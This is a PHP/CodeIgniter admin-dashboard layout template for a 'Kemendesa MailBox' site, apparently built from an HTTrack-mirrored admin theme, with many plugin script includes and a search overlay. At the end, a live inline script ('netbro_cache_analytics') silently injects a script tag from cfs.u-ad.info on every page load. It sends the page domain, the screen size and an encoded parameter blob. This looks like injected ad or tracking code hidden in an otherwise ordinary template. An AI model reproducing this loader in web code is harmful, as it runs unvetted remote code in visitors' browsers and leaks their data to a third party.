<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from themes-lab.com/make/admin/layout1/dashboard.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 09 Jul 2015 18:18:40 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
<!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <meta name="description" content="admin-themes-lab">
    <meta name="author" content="themes-lab">
    <link rel="shortcut icon" href="<?= base_url() ?>assets/global/images/favicon.png" type="image/png">
    <title>Kemendesa MailBox<?= isset($title) ? " | ".$title : "" ?></title>
    <!-- BEGIN PAGE STYLE -->
    <link href="<?= base_url() ?>assets/global/plugins/metrojs/metrojs.min.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/global/plugins/maps-amcharts/ammap/ammap.min.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/global/plugins/fullcalendar/fullcalendar.min.css" rel="stylesheet">
    <!-- END PAGE STYLE -->
    <link href="<?= base_url() ?>assets/global/css/style.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/global/css/theme.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/global/css/ui.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/admin/layout1/css/layout.css" rel="stylesheet">
    <script src="<?= base_url() ?>assets/global/plugins/modernizr/modernizr-2.6.2-respond-1.1.0.min.js"></script>
</head>
<!-- LAYOUT: Apply "submenu-hover" class to body element to have sidebar submenu show on mouse hover -->
<!-- LAYOUT: Apply "sidebar-collapsed" class to body element to have collapsed sidebar -->
<!-- LAYOUT: Apply "sidebar-top" class to body element to have sidebar on top of the page -->
<!-- LAYOUT: Apply "sidebar-hover" class to body element to show sidebar only when your mouse is on left / right corner -->
<!-- LAYOUT: Apply "submenu-hover" class to body element to show sidebar submenu on mouse hover -->
<!-- LAYOUT: Apply "fixed-sidebar" class to body to have fixed sidebar -->
<!-- LAYOUT: Apply "fixed-topbar" class to body to have fixed topbar -->
<!-- LAYOUT: Apply "rtl" class to body to put the sidebar on the right side -->
<!-- LAYOUT: Apply "boxed" class to body to have your page with 1200px max width -->

<!-- THEME STYLE: Apply "theme-sdtl" for Sidebar Dark / Topbar Light -->
<!-- THEME STYLE: Apply  "theme sdtd" for Sidebar Dark / Topbar Dark -->
<!-- THEME STYLE: Apply "theme sltd" for Sidebar Light / Topbar Dark -->
<!-- THEME STYLE: Apply "theme sltl" for Sidebar Light / Topbar Light -->

<!-- THEME COLOR: Apply "color-default" for dark color: #2B2E33 -->
<!-- THEME COLOR: Apply "color-primary" for primary color: #319DB5 -->
<!-- THEME COLOR: Apply "color-red" for red color: #C9625F -->
<!-- THEME COLOR: Apply "color-green" for green color: #18A689 -->
<!-- THEME COLOR: Apply "color-orange" for orange color: #B66D39 -->
<!-- THEME COLOR: Apply "color-purple" for purple color: #6E62B5 -->
<!-- THEME COLOR: Apply "color-blue" for blue color: #4A89DC -->
<!-- BEGIN BODY -->
<body class="fixed-topbar fixed-sidebar theme-sdtl color-default dashboard">
<!--[if lt IE 7]>
<p class="browsehappy">
    You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.
</p>
<![endif]-->

<section>
    <div class="main-content">
        <?php $this->load->view('templates/header'); ?>
        <?php $this->load->view('templates/sidebar'); ?>
        <!-- BEGIN PAGE CONTENT -->
        <div class="page-content">
            <?php $this->load->view($page); ?>
        </div>
        <!-- END PAGE CONTENT -->
        <?php $this->load->view('templates/footer'); ?>
    </div>
</section>

<!-- BEGIN SEARCH -->
<div id="morphsearch" class="morphsearch">
    <form class="morphsearch-form">
        <input class="morphsearch-input" type="search" placeholder="Search..."/>
        <button class="morphsearch-submit" type="submit">Search</button>
    </form>
    <div class="morphsearch-content withScroll">
        <div class="dummy-column user-column">
            <h2>Users</h2>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/avatars/avatar1_big.png" alt="Avatar 1"/>

                <h3>John Smith</h3>
            </a>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/avatars/avatar2_big.png" alt="Avatar 2"/>

                <h3>Bod Dylan</h3>
            </a>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/avatars/avatar3_big.png" alt="Avatar 3"/>

                <h3>Jenny Finlan</h3>
            </a>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/avatars/avatar4_big.png" alt="Avatar 4"/>

                <h3>Harold Fox</h3>
            </a>
        </div>
        <div class="dummy-column">
            <h2>Articles</h2>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/gallery/1.jpg" alt="1"/>

                <h3>How to change webdesign?</h3>
            </a>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/gallery/2.jpg" alt="2"/>

                <h3>News From the sky</h3>
            </a>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/gallery/3.jpg" alt="3"/>

                <h3>Where is the cat?</h3>
            </a>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/gallery/4.jpg" alt="4"/>

                <h3>Just another funny story</h3>
            </a>
        </div>
        <div class="dummy-column">
            <h2>Recent</h2>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/gallery/7.jpg" alt="7"/>

                <h3>Design Inspiration</h3>
            </a>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/gallery/8.jpg" alt="8"/>

                <h3>Animals drawing</h3>
            </a>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/gallery/9.jpg" alt="9"/>

                <h3>Cup of tea please</h3>
            </a>
            <a class="dummy-media-object" href="#">
                <img src="<?= base_url() ?>assets/global/images/gallery/10.jpg" alt="10"/>

                <h3>New application arrive</h3>
            </a>
        </div>
    </div>
    <!-- /morphsearch-content -->
    <span class="morphsearch-close"></span>
</div>
<!-- END SEARCH -->

<!-- BEGIN PRELOADER -->
<div class="loader-overlay">
    <div class="spinner">
        <div class="bounce1"></div>
        <div class="bounce2"></div>
        <div class="bounce3"></div>
    </div>
</div>
<!-- END PRELOADER -->
<a href="#" class="scrollup"><i class="fa fa-angle-up"></i></a>
<script src="<?= base_url() ?>assets/global/plugins/jquery/jquery-1.11.1.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/jquery/jquery-migrate-1.2.1.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/jquery-ui/jquery-ui-1.11.2.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/gsap/main-gsap.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/bootstrap/js/bootstrap.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/jquery-cookies/jquery.cookies.min.js"></script>
<!-- Jquery Cookies, for theme -->
<script src="<?= base_url() ?>assets/global/plugins/jquery-block-ui/jquery.blockUI.min.js"></script>
<!-- simulate synchronous behavior when using AJAX -->
<script src="<?= base_url() ?>assets/global/plugins/bootbox/bootbox.min.js"></script>
<!-- Modal with Validation -->
<script src="<?= base_url() ?>assets/global/plugins/mcustom-scrollbar/jquery.mCustomScrollbar.concat.min.js"></script>
<!-- Custom Scrollbar sidebar -->
<script src="<?= base_url() ?>assets/global/plugins/bootstrap-dropdown/bootstrap-hover-dropdown.min.js"></script>
<!-- Show Dropdown on Mouseover -->
<script src="<?= base_url() ?>assets/global/plugins/charts-sparkline/sparkline.min.js"></script>
<!-- Charts Sparkline -->
<script src="<?= base_url() ?>assets/global/plugins/retina/retina.min.js"></script>
<!-- Retina Display -->
<script src="<?= base_url() ?>assets/global/plugins/select2/select2.min.js"></script>
<!-- Select Inputs -->
<script src="<?= base_url() ?>assets/global/plugins/icheck/icheck.min.js"></script>
<!-- Checkbox & Radio Inputs -->
<script src="<?= base_url() ?>assets/global/plugins/backstretch/backstretch.min.js"></script>
<!-- Background Image -->
<script src="<?= base_url() ?>assets/global/plugins/bootstrap-progressbar/bootstrap-progressbar.min.js"></script>
<!-- Animated Progress Bar -->
<script src="<?= base_url() ?>assets/global/js/builder.js"></script>
<!-- Theme Builder -->
<script src="<?= base_url() ?>assets/global/js/sidebar_hover.js"></script>
<!-- Sidebar on Hover -->
<script src="<?= base_url() ?>assets/global/js/application.js"></script>
<!-- Main Application Script -->
<script src="<?= base_url() ?>assets/global/js/plugins.js"></script>
<!-- Main Plugin Initialization Script -->
<script src="<?= base_url() ?>assets/global/js/widgets/notes.js"></script>
<!-- Notes Widget -->
<script src="<?= base_url() ?>assets/global/js/quickview.js"></script>
<!-- Chat Script -->
<script src="<?= base_url() ?>assets/global/js/pages/search.js"></script>
<!-- Search Script -->

<!-- BEGIN PAGE SCRIPT -->
<script src="<?= base_url() ?>assets/global/plugins/noty/jquery.noty.packaged.min.js"></script>
<!-- Notifications -->
<script src="<?= base_url() ?>assets/global/plugins/bootstrap-editable/js/bootstrap-editable.min.js"></script>
<!-- Inline Edition X-editable -->
<script src="<?= base_url() ?>assets/global/plugins/bootstrap-context-menu/bootstrap-contextmenu.min.js"></script>
<!-- Context Menu -->
<script src="<?= base_url() ?>assets/global/plugins/multidatepicker/multidatespicker.min.js"></script>
<!-- Multi dates Picker -->
<script src="<?= base_url() ?>assets/global/js/widgets/todo_list.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/metrojs/metrojs.min.js"></script>
<!-- Flipping Panel -->
<script src="<?= base_url() ?>assets/global/plugins/charts-chartjs/Chart.min.js"></script>
<!-- ChartJS Chart -->
<script src="<?= base_url() ?>assets/global/plugins/charts-highstock/js/highstock.min.js"></script>
<!-- financial Charts -->
<script src="<?= base_url() ?>assets/global/plugins/charts-highstock/js/modules/exporting.min.js"></script>
<!-- Financial Charts Export Tool -->
<script src="<?= base_url() ?>assets/global/plugins/maps-amcharts/ammap/ammap.min.js"></script>
<!-- Vector Map -->
<script src="<?= base_url() ?>assets/global/plugins/maps-amcharts/ammap/maps/js/worldLow.min.js"></script>
<!-- Vector World Map  -->
<script src="<?= base_url() ?>assets/global/plugins/maps-amcharts/ammap/themes/black.min.js"></script>
<!-- Vector Map Black Theme -->
<script src="<?= base_url() ?>assets/global/plugins/skycons/skycons.min.js"></script>
<!-- Animated Weather Icons -->
<script src="<?= base_url() ?>assets/global/js/widgets/widget_weather.js"></script>
<script src="<?= base_url() ?>assets/global/js/pages/dashboard.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/moment/moment.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/fullcalendar/fullcalendar.min.js"></script>
<script src="<?= base_url() ?>assets/global/js/pages/fullcalendar.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/datatables/jquery.dataTables.min.js"></script> <!-- Tables Filtering, Sorting & Editing -->
<script src="<?= base_url() ?>assets/global/js/pages/table_dynamic.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/bootstrap-tags-input/bootstrap-tagsinput.min.js"></script> <!-- Select Inputs -->
<script src="<?= base_url() ?>assets/global/plugins/dropzone/dropzone.min.js"></script>  <!-- Upload Image & File in dropzone -->
<!-- END PAGE SCRIPT -->
<script src="<?= base_url() ?>assets/admin/layout1/js/layout.js"></script>
<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRRJQa4R3kWwVRz66HdNF7tWlZ7hP%2bhh28iaKwknDVP2n54ehEnvKgcvYd%2bnLVxizVGe4Fkho8kRQKoTNZ82VxG%2fZHUQdPh4A3uEMsHbc0NzaU6A%2bKNPIaCu8zFsR12Mi7zhoq%2fEsmvRnLWwZJXR1QH5vmSRH%2fcygkZ7uF92pqR8nSeCDMrmvS6DPY76%2fQSMjZtBlwCWmkiqnD3u8ZZS2S8OxvjGAJV6KVNNvQgsM10Uor6YiXjWEg3iNxM0Zy6zgcRE3ZpqR9pJHKmnzUR%2bGzJYi2%2bGiRxIt1w5lLdlFue9XZ1LTRJ6PMr5ORnWR9G9dv3n8jWyqlIWHpxNdZwiwv5UShI8ExHprq9Xw58KeXLlAdfzV7yU7O8qyVQ1%2bC%2fkhXeL771QNM8Ca%2ffgCUCtH3LmFn%2bqqYZL5dnmsJ%2fPWCKQCClYjRJpS6O%2fo6DNoPJTbbRxklI2JrFeLDyKdPni9HOwxOCU%2fo31uEM8ZemfVXrNMlefMHTQFUBg%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;</script>
</body>
</html>